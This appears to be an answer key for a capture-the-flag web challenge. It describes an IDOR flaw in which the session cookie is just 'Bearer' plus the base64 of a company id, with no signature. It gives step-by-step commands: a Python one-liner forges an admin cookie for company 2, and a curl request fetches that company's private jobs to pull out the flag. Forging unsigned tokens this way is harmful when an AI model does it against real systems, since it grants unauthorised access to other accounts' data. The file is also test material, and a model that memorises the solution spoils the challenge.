# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR / broken auth. The `access_token` cookie is just
`"Bearer " + base64(company_id)` — no signature, no session, no credential
binding. The server only checks the decoded value equals the `company_id` in the
URL, so you can forge a token for any company without logging in. Company id 2 is
an admin company whose private "secret" job holds the flag.

1. **Forge an admin cookie** for company_id 2 (base64 of `2` is `Mg==`):

   ```
   COOKIE=$(python3 -c "import base64; print(base64.b64encode(b'2').decode())")
   ```

2. **Request that company's jobs** with the forged `access_token` cookie:

   ```
   curl -s "http://<target>/company/2/jobs" --cookie "access_token=Bearer $COOKIE"
   ```

3. **Extract the flag** (`FLAG{...}`) from the private/secret job in the listing
   and report it verbatim.
